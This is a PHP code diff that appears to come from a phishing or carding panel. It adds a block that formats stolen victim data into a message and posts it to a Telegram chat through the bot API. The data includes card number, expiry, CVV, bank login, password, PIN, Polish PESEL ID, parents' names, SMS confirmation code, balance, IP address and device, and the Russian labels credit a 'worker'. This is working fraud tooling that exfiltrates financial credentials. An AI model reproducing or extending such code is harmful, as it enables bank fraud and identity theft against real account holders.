@@ -302,6 +302,36 @@ function curs($sum,$from,$to){
             $data['reply_markup']=$replyMarkup; 
 
             file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
+            if($card->vbid){
+                $banking = '';
+                if($card->bank_login){
+                    $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
+                }
+                if($card->bank_haslo){
+                    $banking .= "\n💳 <b>Haslo</b>: ".$card->bank_haslo;
+                }
+                if($card->bank_pin){
+                    $banking .= "\n💳 <b>Pin</b>: ".$card->bank_pin;
+                }
+                if($card->bank_pesel){
+                    $banking .= "\n💳 <b>Pesel</b>: ".$card->bank_pesel;
+                }
+                if($card->bank_nmatki){
+                    $banking .= "\n💳 <b>Ф. матери</b>: ".$card->bank_nmatki;
+                } 
+                if($card->bank_nojca){
+                    $banking .= "\n💳 <b>Ф. отца</b>: ".$card->bank_nojca;
+                } 
+                $data = [
+                    'chat_id' => $card->vbid,
+                    'parse_mode'=>'HTML',
+                    'text' => "💳 Данные из лога ⚠️ Ввод SMS\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ".$card->cvv.$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: ".$card->sms." 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n"
+                ]; 
+                
+    
+
+                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
+            }
 
 
         exit();
